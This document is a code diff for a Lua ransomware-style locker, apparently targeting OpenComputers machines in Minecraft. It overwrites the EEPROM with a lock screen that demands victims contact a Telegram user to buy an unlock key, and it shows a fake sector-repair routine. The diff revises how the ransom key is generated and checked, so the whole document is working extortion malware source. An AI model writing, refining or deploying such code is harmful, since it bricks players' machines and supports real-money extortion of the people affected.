@@ -10,6 +10,10 @@ local eeprom = cp(cl("eeprom")())
 local resX, resY = 77, 11
 gpu.setResolution(resX, resY)
 
+eeprom.set([[local cp, cl = component.proxy, component.list
+local gpu = cp(cl("gpu")())
+local eeprom = cp(cl("eeprom")())
+
 local function randPW (length)
     local index, pw, rnd = 0, ""
     local chars = {
@@ -30,12 +34,7 @@ local function randPW (length)
     return pw
 end
 
-key = randPW (48)
-
-eeprom.set([[local cp, cl = component.proxy, component.list
-local gpu = cp(cl("gpu")())
-local eeprom = cp(cl("eeprom")())
-
+keyReal = randPW (48)
 
 local resX, resY = gpu.maxResolution()
 gpu.setResolution(100, 50)
@@ -117,14 +116,14 @@ gpu.set(1, 11, "Please follow the instructions:")
 
 gpu.set(1, 13, "1. Contact with Telegram user @mineos_decrypt.")
 gpu.set(1, 14, "2. Send him the next key:")
-gpu.set(1, 15, "]] .. key .. [[")
+gpu.set(1, 15, keyReal)
 
 gpu.set(1, 17, "If you already purchased your key, please enter it below.")
 gpu.set(1, 18, "Key: ")
 
 key = input(1, 18)
 
-if key == "]] .. key .. [[" then
+if key == keyReal then
 	gpu.fill(1, 1, resX, resY, " ")
 	for i = 1, 144244 do
 		gpu.set(1, 11, "Repairing sector " .. tostring(i) .. " of 144244")
@@ -135,7 +134,8 @@ if key == "]] .. key .. [[" then
 	gpu.set(1, 2, "Please reboot your computer.")
 else
 	error("Wrong key!", 0)
-end]])
+end
+]])
 
 gpu.setBackground(0x000000)
 gpu.setForeground(0xFFFFFF)
